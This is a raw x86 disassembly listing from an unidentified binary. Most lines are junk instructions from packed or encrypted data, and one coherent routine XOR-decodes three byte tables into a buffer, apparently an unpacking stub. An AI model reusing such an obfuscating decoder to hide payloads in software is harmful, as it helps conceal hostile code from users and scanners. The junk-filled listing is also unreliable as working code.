  416a16:	add    BYTE PTR [ebx+eax*1+0x22838983],bh
  416a1d:	daa    
  416a1e:	jmp    FWORD PTR [ebx-0x337c00b8]
  416a24:	gs xchg esp,eax
  416a26:	int3   
  416a27:	sahf   
  416a28:	icebp  
  416a29:	add    DWORD PTR [eax],0xffffff83
  416a2c:	scas   al,BYTE PTR es:[edi]
  416a2d:	pop    ss
  416a2e:	push   DWORD PTR [edi]
  416a30:	xor    DWORD PTR [ebx-0x7d5cff01],eax
  416a36:	int3   
  416a37:	ret    
  416a38:	xor    edi,edi
  416a3a:	mov    DWORD PTR [ebx-0x28ff8e5d],eax
  416a40:	mov    eax,DWORD PTR [eax]
  416a42:	inc    DWORD PTR [eax]
  416a44:	sahf   
  416a45:	mov    eax,0xff4361ff
  416a4a:	cmp    edi,0x7b
  416a4d:	test   eax,0x8311f6ff
  416a52:	inc    DWORD PTR [eax]
  416a54:	fst    QWORD PTR [eax]
  416a56:	sbb    DWORD PTR ds:0x83ffccd7,0x0
  416a5d:	imul   edi,edi,0xff008184
  416a63:	mov    DWORD PTR [edi],ecx
  416a65:	xor    al,0xff
  416a67:	or     eax,0xff8300ea
  416a6c:	add    eax,0x1e408987
  416a71:	int3   
  416a72:	inc    DWORD PTR [eax]
  416a74:	fstp   DWORD PTR [eax]
  416a76:	sbb    DWORD PTR [ecx-0x7c00ffdf],0xfffffff6
  416a7d:	outs   dx,DWORD PTR ds:[esi]
  416a7e:	push   esp
  416a80:	stos   BYTE PTR es:[edi],al
  416a81:	inc    DWORD PTR [eax]
  416a83:	inc    DWORD PTR [esi+0x2a]
  416a86:	(bad)  
  416a87:	jg     0x416ad8
  416a89:	add    bh,bh
  416a8b:	add    BYTE PTR [edi+edx*8],dh
  416a8e:	(bad)  
  416a8f:	(bad)  
  416a90:	sub    eax,0x5bff8900
  416a95:	rol    BYTE PTR [eax],cl
  416a97:	jne    0x416a21
  416a99:	inc    DWORD PTR [eax]
  416a9b:	add    DWORD PTR [esi+0x54],0xffffff83
  416a9f:	call   0x426a9c
  416aa4:	pop    ss
  416aa5:	sbb    DWORD PTR [ecx+0xffe72c],ecx
  416aab:	cmp    ebp,0x5
  416aae:	call   eax
  416ab0:	and    al,0x83
  416ab2:	add    DWORD PTR [ebx+0x26ffdec3],0x2
  416ab9:	add    bh,bh
  416abb:	jmp    DWORD PTR [eax]
  416abd:	cmp    al,0x89
  416abf:	aaa    
  416ac0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ac1:	add    BYTE PTR [ecx+0x1b0b00],cl
  416ac7:	aam    0x7c
  416ac9:	add    bh,bh
  416acb:	and    DWORD PTR [edi],0x5d
  416ace:	sbb    edx,0xffffffea
  416ad1:	(bad)  
  416ad2:	(bad)  
  416ad3:	push   DWORD PTR [edi]
  416ad5:	jle    0x416a5a
  416ad7:	je     0x416ad9
  416ad9:	inc    DWORD PTR [eax]
  416adb:	jmp    FWORD PTR [ecx+0x6c]
  416ade:	xor    DWORD PTR [esi+0x65],0x0
  416ae2:	cmp    edi,0xb
  416ae5:	cmp    bh,0x7b
  416ae8:	push   ebx
  416ae9:	add    BYTE PTR [eax],al
  416aeb:	and    DWORD PTR [edi+0x17],0xffffffcc
  416aef:	pop    bp
  416af1:	add    ah,cl
  416af3:	push   DWORD PTR [ebx-0x17]
  416af6:	add    BYTE PTR [edi-0x7d],dh
  416af9:	inc    DWORD PTR [ebx-0x3380797d]
  416aff:	push   eax
  416b00:	cmp    edi,edi
  416b02:	add    DWORD PTR [ebx-0x676ad55],0x1a
  416b09:	add    BYTE PTR [eax],al
  416b0b:	int3   
  416b0c:	push   esp
  416b0d:	(bad)  
  416b0f:	dec    ebp
  416b10:	pop    esi
  416b11:	add    bh,bh
  416b13:	inc    esi
  416b15:	mov    al,ds:0x890f1b89
  416b1a:	(bad)  
  416b1b:	push   DWORD PTR [edi]
  416b1d:	(bad)  
  416b1e:	jmp    edx
  416b20:	mov    ebp,0x34ff0000
  416b25:	add    edi,edi
  416b27:	sahf   
  416b28:	dec    edi
  416b29:	add    BYTE PTR [eax],al
  416b2b:	mov    DWORD PTR [edi+0x6b],ebp
  416b2e:	add    bh,bl
  416b30:	add    BYTE PTR [ebx+0x2ed800ff],al
  416b36:	add    BYTE PTR [ecx+0x4a],cl
  416b39:	(bad)  
  416b3a:	(bad)  
  416b3b:	call   DWORD PTR [ecx-0x2f5dff12]
  416b41:	inc    DWORD PTR [eax]
  416b43:	dec    DWORD PTR [eax+0x17]
  416b46:	int3   
  416b47:	or     BYTE PTR gs:[eax],al
  416b4a:	(bad)  
  416b4b:	call   FWORD PTR [ecx+0x46]
  416b4e:	inc    DWORD PTR [edi+0xffff1b]
  416b54:	sub    eax,0x52048342
  416b59:	cmp    edi,0xffffff83
  416b5c:	enter  0x8321,0x95
  416b60:	mov    al,BYTE PTR [ebx-0x661f0001]
  416b66:	inc    DWORD PTR [esi+0xff44]
  416b6c:	mov    bl,0x3b
  416b6e:	add    BYTE PTR [ecx-0x76ff7682],ch
  416b74:	mov    ebx,0x53b100a4
  416b79:	inc    DWORD PTR [eax]
  416b7b:	add    BYTE PTR [eax],al
  416b7d:	(bad)  
  416b7f:	jbe    0x416b4f
  416b81:	add    BYTE PTR [eax],al
  416b83:	int3   
  416b84:	scas   al,BYTE PTR es:[edi]
  416b85:	dec    ebp
  416b86:	dec    DWORD PTR [edx-0xffe5]
  416b8c:	fs aas 
  416b8e:	inc    esi
  416b90:	jnp    0x416b92
  416b92:	mov    edi,edi
  416b94:	adc    DWORD PTR [esp+ecx*8-0x47],edx
  416b98:	jne    0x416b99
  416b9a:	int3   
  416b9b:	or     DWORD PTR [edi],0xffffffab
  416b9e:	add    ah,cl
  416ba0:	(bad)  
  416ba1:	(bad)  
  416ba2:	(bad)  
  416ba3:	jmp    DWORD PTR [edi+0x162dff56]
  416ba9:	(bad)  
  416baa:	(bad)  
  416bab:	(bad)  
  416bac:	(bad)  
  416bae:	jmp    DWORD PTR [ebx]
  416bb0:	push   ss
  416bb1:	add    bh,bh
  416bb3:	add    DWORD PTR [ebp+0x7028ff70],0xffffffff
  416bba:	dec    esp
  416bbc:	inc    esi
  416bbd:	sub    eax,0xabcd00
  416bc2:	(bad)  
  416bc3:	dec    ebp
  416bc5:	mov    dh,0xff
  416bc7:	pusha  
  416bc8:	mov    al,ds:0x6100ffff
  416bcd:	and    al,0x0
  416bcf:	jne    0x416c35
  416bd1:	cmp    edi,0x0
  416bd4:	test   al,0xde
  416bd6:	add    BYTE PTR [edi],dl
  416bd8:	and    DWORD PTR [eax],eax
  416bda:	add    BYTE PTR [ebx+0x30ffc825],al
  416be0:	mov    eax,ds:0xb7ffff83
  416be5:	inc    esp
  416be6:	jmp    FWORD PTR [ecx]
  416be8:	cmp    edi,0xffffff83
  416beb:	mov    DWORD PTR [ebp+edi*8-0x7c844c00],edi
  416bf2:	(bad)  
  416bf3:	jmp    FWORD PTR [ebx+edx*1]
  416bf6:	add    BYTE PTR [edi],dh
  416bf8:	xchg   esi,eax
  416bf9:	cmp    edi,0x0
  416bfc:	sub    eax,0x7cbfff80
  416c01:	int3   
  416c02:	add    bh,bh
  416c04:	inc    esp
  416c05:	inc    esi
  416c06:	mov    DWORD PTR [ecx+edx*1],eax
  416c09:	inc    DWORD PTR [eax]
  416c0b:	call   FWORD PTR [edx+0x1f]
  416c0e:	jmp    FWORD PTR [ebp+ebp*1+0x5effffff]
  416c15:	lods   al,BYTE PTR ds:[esi]
  416c16:	add    BYTE PTR [eax-0xffff3e],al
  416c1c:	dec    edi
  416c1d:	or     eax,0x83aa4eff
  416c22:	(bad)  
  416c23:	push   ecx
  416c25:	xchg   esp,eax
  416c26:	jmp    FWORD PTR [esi+0xffff9b]
  416c2c:	push   esi
  416c2d:	sti    
  416c2e:	mov    DWORD PTR [eax+0x72],esp
  416c31:	int3   
  416c32:	mov    edi,edi
  416c34:	(bad)  [edx+0x0]
  416c37:	cmp    DWORD PTR [ebp+0x220083cc],ebp
  416c3d:	mov    edi,edi
  416c3f:	fdiv   DWORD PTR [esi+0x260083ff]
  416c45:	icebp  
  416c46:	jmp    DWORD PTR [eax-0x7f]
  416c49:	(bad)  
  416c4a:	(bad)  
  416c4b:	jmp    FWORD PTR [ebx]
  416c4d:	popa   
  416c4e:	add    BYTE PTR [eax-0x767c7caf],cl
  416c54:	push   ebp
  416c55:	add    edi,edi
  416c57:	mov    edi,edx
  416c59:	int3   
  416c5a:	(bad)  
  416c5b:	(bad)  
  416c5c:	out    dx,al
  416c5d:	xchg   DWORD PTR [eax],eax
  416c5f:	mov    dl,0xdf
  416c61:	int3   
  416c62:	add    BYTE PTR [eax],al
  416c64:	or     eax,DWORD PTR [edi+edi*8+0x7d]
  416c68:	mov    esp,0x63ff0000
  416c6d:	rol    DWORD PTR [eax],0x9d
  416c70:	stc    
  416c71:	(bad)  
  416c72:	(bad)  
  416c73:	jmp    ecx
  416c75:	mov    ds:0xcc4347ff,al
  416c7a:	(bad)  
  416c7b:	inc    DWORD PTR [edx+0x659eff98]
  416c81:	inc    DWORD PTR [eax]
  416c83:	add    BYTE PTR [eax-0x1c],al
  416c86:	jmp    FWORD PTR [edi-0x16]
  416c89:	(bad)  
  416c8a:	dec    esp
  416c8c:	iret   
  416c8d:	mov    bh,0x0
  416c8f:	adc    esp,DWORD PTR [ecx-0x1]
  416c92:	inc    DWORD PTR [eax]
  416c94:	jns    0x416c1f
  416c96:	jmp    DWORD PTR [ebx+0x83ff27]
  416c9c:	inc    edi
  416c9d:	test   BYTE PTR [ecx-0x3300efc4],0xff
  416ca4:	test   DWORD PTR [edx],eax
  416ca6:	add    BYTE PTR [eax-0x75],dh
  416ca9:	add    BYTE PTR [ebx+0x3b93ff],al
  416caf:	push   ss
  416cb0:	cmp    bh,0xff
  416cb3:	(bad)  
  416cb4:	jnp    0x416d08
  416cb6:	int3   
  416cb7:	call   0x1416cae
  416cbc:	out    dx,al
  416cbd:	dec    ebx
  416cbe:	mov    edx,edx
  416cc0:	(bad)  
  416cc1:	int3   
  416cc2:	dec    DWORD PTR [ecx-0x4400e9d8]
  416cc8:	jmp    0x416cca
  416cca:	mov    edi,edi
  416ccc:	sub    dl,cl
  416cce:	int3   
  416ccf:	cmp    eax,0x8383fffd
  416cd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416cd5:	cdq    
  416cd6:	add    ch,ch
  416cd8:	jne    0x416cda
  416cda:	cmp    edi,0x1b
  416cdd:	mov    bh,0x89
  416cdf:	xchg   esi,eax
  416ce0:	enter  0x8300,0xff
  416ce4:	xor    ebx,edx
  416ce6:	(bad)  
  416ce7:	aas    
  416ce8:	xchg   esp,eax
  416ce9:	(bad)  
  416cea:	inc    DWORD PTR [eax]
  416cec:	sub    eax,0x5fd1ffa3
  416cf1:	add    BYTE PTR [eax],al
  416cf3:	cmp    DWORD PTR [ebx+esi*1-0x7d],0x5e
  416cf8:	xor    edi,edi
  416cfa:	(bad)  
  416cfb:	push   DWORD PTR [edx-0x73]
  416cfe:	dec    ecx
  416d00:	pop    ebp
  416d01:	add    bh,bh
  416d03:	inc    DWORD PTR [eax]
  416d05:	fwait
  416d06:	dec    DWORD PTR [esi-0x7c001d]
  416d0c:	dec    ebp
  416d0d:	jle    0x416d0e
  416d0f:	addr16 int 0xff
  416d12:	int3   
  416d13:	push   esi
  416d15:	mov    BYTE PTR [ebx+0xff33f9],al
  416d1b:	add    BYTE PTR [edi+edi*2-0x1],cl
  416d1f:	mov    WORD PTR ds:0x64ff0000,ss
  416d25:	in     eax,0xff
  416d27:	lds    ebx,FWORD PTR [ecx+0x0]
  416d2a:	inc    DWORD PTR [ebx+0x38ffcd30]
  416d30:	sub    bh,bh
  416d32:	mov    edi,edi
  416d34:	push   0xab3f83c3
  416d39:	(bad)  
  416d3a:	(bad)  
  416d3b:	call   FWORD PTR [ebx]
  416d3d:	inc    ebx
  416d3e:	add    BYTE PTR [ebx],bl
  416d40:	retf   
  416d41:	add    BYTE PTR [eax],al
  416d43:	push   DWORD PTR [eax+0x37a0ffb6]
  416d49:	add    BYTE PTR [ebx-0xfa6577],al
  416d4f:	push   ss
  416d50:	rol    DWORD PTR [eax],0x0
  416d53:	push   edx
  416d55:	(bad)  
  416d56:	call   DWORD PTR [eax-0x76000011]
  416d5c:	or     BYTE PTR [esi],ah
  416d5e:	jmp    FWORD PTR [ebp+edi*1-0x1]
  416d62:	int3   
  416d63:	push   DWORD PTR [ebx-0x691d005f]
  416d69:	(bad)  
  416d6a:	(bad)  
  416d6b:	inc    DWORD PTR [ecx+0x6a]
  416d6e:	call   ebx
  416d70:	dec    esi
  416d71:	inc    DWORD PTR [ebx-0x76e19934]
  416d77:	daa    
  416d78:	fs (bad) 
  416d7a:	inc    DWORD PTR [eax]
  416d7c:	pop    esp
  416d7d:	dec    eax
  416d7e:	int3   
  416d7f:	les    eax,FWORD PTR [edi]
  416d81:	cmp    edi,0xffffffff
  416d84:	sbb    bh,BYTE PTR [edi-0x3333167d]
  416d8a:	int3   
  416d8b:	int3   
  416d8c:	int3   
  416d8d:	int3   
  416d8e:	int3   
  416d8f:	int3   
  416d90:	sub    esp,0x10
  416d93:	push   esi
  416d94:	push   edi
  416d95:	mov    edi,DWORD PTR ds:0x445058
  416d9b:	mov    DWORD PTR [esp+0x8],0x6a
  416da3:	mov    DWORD PTR [esp+0xc],0x5f
  416dab:	mov    DWORD PTR [esp+0x10],0x0
  416db3:	mov    DWORD PTR [esp+0x14],0x3b
  416dbb:	call   edi
  416dbd:	mov    ecx,DWORD PTR ds:0x448d20
  416dc3:	mov    edx,DWORD PTR ds:0x4480e8
  416dc9:	add    ecx,0x833c
  416dcf:	mov    esi,0x6f
  416dd4:	push   ebx
  416dd5:	movzx  eax,WORD PTR [edx+0x5]
  416dd9:	movzx  ebx,BYTE PTR [edx+0x2]
  416ddd:	movzx  edx,BYTE PTR [edx]
  416de0:	shl    eax,0x8
  416de3:	add    eax,ebx
  416de5:	shl    eax,0x8
  416de8:	add    eax,edx
  416dea:	mov    ds:0x448d10,eax
  416def:	mov    edx,0x75d41d05
  416df4:	sub    edx,DWORD PTR ds:0x448d1c
  416dfa:	add    ecx,0xc
  416dfd:	xor    edx,eax
  416dff:	mov    DWORD PTR [ecx-0xc],edx
  416e02:	mov    edx,DWORD PTR ds:0x4480e8
  416e08:	add    edx,0x8
  416e0b:	mov    DWORD PTR ds:0x4480e8,edx
  416e11:	movzx  eax,WORD PTR [edx+0x5]
  416e15:	movzx  ebx,BYTE PTR [edx+0x2]
  416e19:	movzx  edx,BYTE PTR [edx]
  416e1c:	shl    eax,0x8
  416e1f:	add    eax,ebx
  416e21:	shl    eax,0x8
  416e24:	add    eax,edx
  416e26:	mov    ds:0x448d10,eax
  416e2b:	mov    edx,0x75d41d05
  416e30:	sub    edx,DWORD PTR ds:0x448d1c
  416e36:	xor    edx,eax
  416e38:	mov    DWORD PTR [ecx-0x8],edx
  416e3b:	mov    edx,DWORD PTR ds:0x4480e8
  416e41:	add    edx,0x8
  416e44:	mov    DWORD PTR ds:0x4480e8,edx
  416e4a:	movzx  eax,WORD PTR [edx+0x5]
  416e4e:	movzx  ebx,BYTE PTR [edx+0x2]
  416e52:	movzx  edx,BYTE PTR [edx]
  416e55:	shl    eax,0x8
  416e58:	add    eax,ebx
  416e5a:	shl    eax,0x8
  416e5d:	add    eax,edx
  416e5f:	mov    edx,0x75d41d05
  416e64:	sub    edx,DWORD PTR ds:0x448d1c
  416e6a:	mov    ds:0x448d10,eax
  416e6f:	xor    edx,eax
  416e71:	mov    DWORD PTR [ecx-0x4],edx
  416e74:	mov    edx,DWORD PTR ds:0x4480e8
  416e7a:	add    edx,0x8
  416e7d:	dec    esi
  416e7e:	mov    DWORD PTR ds:0x4480e8,edx
  416e84:	jne    0x416dd5
  416e8a:	call   edi
  416e8c:	mov    esi,DWORD PTR ds:0x448d20
  416e92:	lea    eax,[esp+0xc]
  416e96:	push   eax
  416e97:	push   0x0
  416e99:	call   DWORD PTR ds:0x44505c
  416e9f:	mov    edx,DWORD PTR ds:0x4480ec
  416ea5:	lea    eax,[esi+0x8878]
  416eab:	mov    esi,0x4b
  416eb0:	movzx  ecx,BYTE PTR [edx+0x7]
  416eb4:	movzx  ebx,WORD PTR [edx+0x4]
  416eb8:	movzx  edx,BYTE PTR [edx]
  416ebb:	shl    ecx,0x10
  416ebe:	add    ecx,ebx
  416ec0:	shl    ecx,0x8
  416ec3:	add    ecx,edx
  416ec5:	mov    DWORD PTR ds:0x448d10,ecx
  416ecb:	mov    edx,0x1996fa20
  416ed0:	sub    edx,DWORD PTR ds:0x448d1c
  416ed6:	xor    edx,ecx
  416ed8:	mov    DWORD PTR [eax-0x8],edx
  416edb:	mov    edx,DWORD PTR ds:0x4480ec
  416ee1:	add    edx,0x8
  416ee4:	mov    DWORD PTR ds:0x4480ec,edx
  416eea:	movzx  ecx,BYTE PTR [edx+0x7]
  416eee:	movzx  ebx,WORD PTR [edx+0x4]
  416ef2:	movzx  edx,BYTE PTR [edx]
  416ef5:	shl    ecx,0x10
  416ef8:	add    ecx,ebx
  416efa:	shl    ecx,0x8
  416efd:	add    ecx,edx
  416eff:	mov    DWORD PTR ds:0x448d10,ecx
  416f05:	mov    edx,0x1996fa20
  416f0a:	sub    edx,DWORD PTR ds:0x448d1c
  416f10:	xor    edx,ecx
  416f12:	mov    DWORD PTR [eax-0x4],edx
  416f15:	mov    edx,DWORD PTR ds:0x4480ec
  416f1b:	add    edx,0x8
  416f1e:	mov    DWORD PTR ds:0x4480ec,edx
  416f24:	movzx  ecx,BYTE PTR [edx+0x7]
  416f28:	movzx  ebx,WORD PTR [edx+0x4]
  416f2c:	movzx  edx,BYTE PTR [edx]
  416f2f:	shl    ecx,0x10
  416f32:	add    ecx,ebx
  416f34:	shl    ecx,0x8
  416f37:	add    ecx,edx
  416f39:	mov    DWORD PTR ds:0x448d10,ecx
  416f3f:	mov    edx,0x1996fa20
  416f44:	sub    edx,DWORD PTR ds:0x448d1c
  416f4a:	xor    edx,ecx
  416f4c:	mov    DWORD PTR [eax],edx
  416f4e:	mov    edx,DWORD PTR ds:0x4480ec
  416f54:	add    edx,0x8
  416f57:	mov    DWORD PTR ds:0x4480ec,edx
  416f5d:	movzx  ecx,BYTE PTR [edx+0x7]
  416f61:	movzx  ebx,WORD PTR [edx+0x4]
  416f65:	movzx  edx,BYTE PTR [edx]
  416f68:	shl    ecx,0x10
  416f6b:	add    ecx,ebx
  416f6d:	shl    ecx,0x8
  416f70:	add    ecx,edx
  416f72:	mov    DWORD PTR ds:0x448d10,ecx
  416f78:	mov    edx,0x1996fa20
  416f7d:	sub    edx,DWORD PTR ds:0x448d1c
  416f83:	xor    edx,ecx
  416f85:	mov    DWORD PTR [eax+0x4],edx
  416f88:	mov    edx,DWORD PTR ds:0x4480ec
  416f8e:	add    edx,0x8
  416f91:	mov    DWORD PTR ds:0x4480ec,edx
  416f97:	movzx  ecx,BYTE PTR [edx+0x7]
  416f9b:	movzx  ebx,WORD PTR [edx+0x4]
  416f9f:	movzx  edx,BYTE PTR [edx]
  416fa2:	shl    ecx,0x10
  416fa5:	add    ecx,ebx
  416fa7:	shl    ecx,0x8
  416faa:	add    ecx,edx
  416fac:	mov    DWORD PTR ds:0x448d10,ecx
  416fb2:	mov    edx,0x1996fa20
  416fb7:	sub    edx,DWORD PTR ds:0x448d1c
  416fbd:	xor    edx,ecx
  416fbf:	mov    DWORD PTR [eax+0x8],edx
  416fc2:	mov    edx,DWORD PTR ds:0x4480ec
  416fc8:	add    edx,0x8
  416fcb:	mov    DWORD PTR ds:0x4480ec,edx
  416fd1:	movzx  ecx,BYTE PTR [edx+0x7]
  416fd5:	movzx  ebx,WORD PTR [edx+0x4]
  416fd9:	movzx  edx,BYTE PTR [edx]
  416fdc:	shl    ecx,0x10
  416fdf:	add    ecx,ebx
  416fe1:	shl    ecx,0x8
  416fe4:	add    ecx,edx
  416fe6:	mov    edx,0x1996fa20
  416feb:	sub    edx,DWORD PTR ds:0x448d1c
  416ff1:	mov    DWORD PTR ds:0x448d10,ecx
  416ff7:	xor    edx,ecx
  416ff9:	mov    DWORD PTR [eax+0xc],edx
  416ffc:	mov    edx,DWORD PTR ds:0x4480ec
  417002:	add    edx,0x8
  417005:	add    eax,0x18
  417008:	dec    esi
  417009:	mov    DWORD PTR ds:0x4480ec,edx
  41700f:	jne    0x416eb0
  417015:	call   edi
  417017:	mov    ecx,DWORD PTR ds:0x448d20
  41701d:	mov    edx,DWORD PTR ds:0x4480f0
  417023:	add    ecx,0x8f78
  417029:	mov    esi,0x58
  41702e:	pop    ebx
  41702f:	nop
  417030:	movzx  eax,BYTE PTR [edx+0x6]
  417034:	movzx  edi,BYTE PTR [edx+0x4]
  417038:	shl    eax,0x8
  41703b:	add    eax,edi
  41703d:	movzx  edi,BYTE PTR [edx+0x2]
  417041:	movzx  edx,BYTE PTR [edx]
  417044:	shl    eax,0x8
  417047:	add    eax,edi
  417049:	shl    eax,0x8
  41704c:	add    eax,edx
  41704e:	mov    ds:0x448d10,eax
  417053:	mov    edx,DWORD PTR ds:0x448d1c
  417059:	add    edx,0x4838dee6
  41705f:	xor    edx,eax
  417061:	mov    DWORD PTR [ecx],edx
  417063:	mov    edx,DWORD PTR ds:0x4480f0
  417069:	add    edx,0x8
  41706c:	mov    DWORD PTR ds:0x4480f0,edx
  417072:	movzx  eax,BYTE PTR [edx+0x6]
  417076:	movzx  edi,BYTE PTR [edx+0x4]
  41707a:	shl    eax,0x8
  41707d:	add    eax,edi
  41707f:	movzx  edi,BYTE PTR [edx+0x2]
  417083:	movzx  edx,BYTE PTR [edx]
  417086:	shl    eax,0x8
  417089:	add    eax,edi
  41708b:	shl    eax,0x8
  41708e:	add    eax,edx
  417090:	mov    edx,DWORD PTR ds:0x448d1c
  417096:	mov    ds:0x448d10,eax
  41709b:	add    edx,0x4838dee6
  4170a1:	xor    edx,eax
  4170a3:	mov    DWORD PTR [ecx+0x4],edx
  4170a6:	mov    edx,DWORD PTR ds:0x4480f0
  4170ac:	add    edx,0x8
  4170af:	mov    DWORD PTR ds:0x4480f0,edx
  4170b5:	movzx  eax,BYTE PTR [edx+0x6]
  4170b9:	movzx  edi,BYTE PTR [edx+0x4]
  4170bd:	shl    eax,0x8
  4170c0:	add    eax,edi
  4170c2:	movzx  edi,BYTE PTR [edx+0x2]
  4170c6:	movzx  edx,BYTE PTR [edx]
  4170c9:	shl    eax,0x8
  4170cc:	add    eax,edi
  4170ce:	shl    eax,0x8
  4170d1:	add    eax,edx
  4170d3:	mov    edx,DWORD PTR ds:0x448d1c
  4170d9:	mov    ds:0x448d10,eax
  4170de:	add    edx,0x4838dee6
  4170e4:	xor    edx,eax
  4170e6:	mov    DWORD PTR [ecx+0x8],edx
  4170e9:	mov    edx,DWORD PTR ds:0x4480f0
  4170ef:	add    edx,0x8
  4170f2:	mov    DWORD PTR ds:0x4480f0,edx
  4170f8:	movzx  eax,BYTE PTR [edx+0x6]
  4170fc:	movzx  edi,BYTE PTR [edx+0x4]
  417100:	shl    eax,0x8
  417103:	add    eax,edi
  417105:	movzx  edi,BYTE PTR [edx+0x2]
  417109:	movzx  edx,BYTE PTR [edx]
  41710c:	shl    eax,0x8
  41710f:	add    eax,edi
  417111:	shl    eax,0x8
  417114:	add    eax,edx
  417116:	mov    edx,DWORD PTR ds:0x448d1c
  41711c:	mov    ds:0x448d10,eax
  417121:	add    edx,0x4838dee6
  417127:	xor    edx,eax
  417129:	mov    DWORD PTR [ecx+0xc],edx
  41712c:	mov    edx,DWORD PTR ds:0x4480f0
  417132:	add    edx,0x8
  417135:	mov    DWORD PTR ds:0x4480f0,edx
  41713b:	movzx  eax,BYTE PTR [edx+0x6]
  41713f:	movzx  edi,BYTE PTR [edx+0x4]
  417143:	shl    eax,0x8
  417146:	add    eax,edi
  417148:	movzx  edi,BYTE PTR [edx+0x2]
  41714c:	movzx  edx,BYTE PTR [edx]
  41714f:	shl    eax,0x8
  417152:	add    eax,edi
  417154:	shl    eax,0x8
  417157:	add    eax,edx
  417159:	mov    edx,DWORD PTR ds:0x448d1c
  41715f:	mov    ds:0x448d10,eax
  417164:	add    edx,0x4838dee6
  41716a:	xor    edx,eax
  41716c:	mov    DWORD PTR [ecx+0x10],edx
  41716f:	mov    edx,DWORD PTR ds:0x4480f0
  417175:	add    edx,0x8
  417178:	mov    DWORD PTR ds:0x4480f0,edx
  41717e:	movzx  eax,BYTE PTR [edx+0x6]
  417182:	movzx  edi,BYTE PTR [edx+0x4]
  417186:	shl    eax,0x8
  417189:	add    eax,edi
  41718b:	movzx  edi,BYTE PTR [edx+0x2]
  41718f:	movzx  edx,BYTE PTR [edx]
  417192:	shl    eax,0x8
  417195:	add    eax,edi
  417197:	shl    eax,0x8
  41719a:	add    eax,edx
  41719c:	mov    edx,DWORD PTR ds:0x448d1c
  4171a2:	add    edx,0x4838dee6
  4171a8:	xor    edx,eax
  4171aa:	mov    ds:0x448d10,eax
  4171af:	mov    DWORD PTR [ecx+0x14],edx
  4171b2:	mov    edx,DWORD PTR ds:0x4480f0
  4171b8:	add    edx,0x8
  4171bb:	add    ecx,0x18
  4171be:	dec    esi
  4171bf:	mov    DWORD PTR ds:0x4480f0,edx
  4171c5:	jne    0x417030
  4171cb:	pop    edi
  4171cc:	pop    esi
  4171cd:	add    esp,0x10
  4171d0:	ret    
  4171d1:	int3   
  4171d2:	int3   
  4171d3:	int3   
  4171d4:	int3   
  4171d5:	int3   
  4171d6:	int3   
  4171d7:	int3   
  4171d8:	int3   
  4171d9:	int3   
  4171da:	int3   
  4171db:	int3   
  4171dc:	int3   
  4171dd:	int3   
  4171de:	int3   
  4171df:	int3   
  4171e0:	in     al,0xa3
  4171e2:	xchg   ebp,eax
  4171e3:	mov    DWORD PTR [eax],eax
  4171e5:	ja     0x4171b3
  4171e7:	int3   
  4171e8:	data16 stos BYTE PTR es:[edi],al
  4171ea:	jle    0x4171ec
  4171ec:	add    dl,bh
  4171ee:	mov    DWORD PTR [ebx+0xa8600c],eax
  4171f4:	add    dh,cl
  4171f6:	add    BYTE PTR [ebx-0x3ce55e],al
  4171fc:	inc    DWORD PTR [esi]
  4171fe:	mov    esp,ecx
  417200:	inc    edx
  417201:	out    0x8e,eax
  417203:	mov    DWORD PTR [eax],eax
  417205:	xlat   BYTE PTR ds:[ebx]
  417206:	(bad)  
  417207:	inc    ebx
  417209:	fild   WORD PTR [eax-0x760d0100]
  41720f:	jmp    eax
  417211:	imul   ebx,DWORD PTR [ebp-0x33f1007d],0xffffffff
  417218:	test   DWORD PTR [ecx-0x5],eax
  41721b:	(bad)  
  41721c:	call   FWORD PTR [ecx+0x0]
  41721f:	add    BYTE PTR [eax+0x432],ch
  417225:	sub    al,0x89
  417227:	adc    DWORD PTR [edi-0x66],0x6e
  41722b:	int3   
  41722c:	add    BYTE PTR [ebp-0x1],ch
  41722f:	(bad)  
  417230:	mov    ebx,0xffffcd5a
  417235:	pop    esi
  417236:	add    BYTE PTR [eax],al
  417238:	test   bl,dh
  41723a:	cmp    bh,bh
  41723c:	push   DWORD PTR [ecx+ecx*4+0x18e40789]
  417243:	int3   
  417244:	xor    DWORD PTR [ebp-0x7d],0xffffffff
  417248:	imul   ecx,DWORD PTR [esi+0x5f],0x52ffff
  41724f:	int3   
  417250:	pop    ss
  417251:	cdq    
  417252:	(bad)  
  417253:	dec    esp
  417255:	stos   DWORD PTR es:[edi],eax
  417256:	inc    DWORD PTR [eax]
  417258:	dec    edx
  417259:	mov    DWORD PTR [ecx+0x0],ebp
  41725c:	add    BYTE PTR [ebx+0x6f2100ff],bl
  417262:	mov    cl,0x83
  417264:	add    BYTE PTR [edi+edi*8-0x1],bh
  417268:	fwait
  417269:	mov    esp,DWORD PTR [ebx-0x7d]
  41726c:	add    cl,bh
  41726e:	add    DWORD PTR [ebx-0x76d4b67a],0xffffffff
  417275:	mov    edx,0x816500ff
  41727a:	and    al,0xcc
  41727c:	(bad)  
  41727d:	std    
  41727e:	add    bh,bh
  417280:	nop
  417281:	out    dx,eax
  417282:	xor    bh,bh
  417284:	add    BYTE PTR [esi-0x77],dh
  417287:	adc    DWORD PTR [ebp-0xe],0x70
  41728b:	(bad)  
  41728c:	(bad)  
  41728d:	in     eax,dx
  41728e:	inc    DWORD PTR [eax]
  417290:	(bad)  
  417291:	aaa    
  417292:	push   esp
  417293:	cmp    edi,0xffffff9e
  417296:	add    BYTE PTR [eax],al
  417298:	into   
  417299:	bound  edx,QWORD PTR [ebp+0x2c0000]
  41729f:	and    DWORD PTR [eax-0x779d],0xffffffb6
  4172a6:	add    BYTE PTR [eax],al
  4172a8:	pusha  
  4172a9:	sub    eax,0xae83ff77
  4172ae:	mov    DWORD PTR [eax],eax
  4172b0:	cmp    BYTE PTR [esi+edi*4+0x0],bh
  4172b4:	xor    eax,0x0
  4172b7:	add    DWORD PTR [edx+0x3],0xe
  4172bb:	(bad)  
  4172bc:	call   FWORD PTR ds:0x2cadffff
  4172c2:	dec    eax
  4172c3:	(bad)  
  4172c4:	push   DWORD PTR [esi-0x3bb50034]
  4172ca:	xlat   BYTE PTR ds:[ebx]
  4172cb:	dec    DWORD PTR [ecx-0x750033ea]
  4172d1:	sub    al,0x97
  4172d3:	dec    esp
  4172d5:	sub    edi,edi
  4172d7:	sub    DWORD PTR [ebx+0x5],0xffffffad
  4172db:	int3   
  4172dc:	sub    edx,0xffffffff
  4172df:	add    BYTE PTR [edi-0xa],ch
  4172e2:	fdiv   st(7),st
  4172e4:	(bad)  
  4172e5:	fadd   QWORD PTR [ebx+0x723eeaff]
  4172eb:	(bad)  
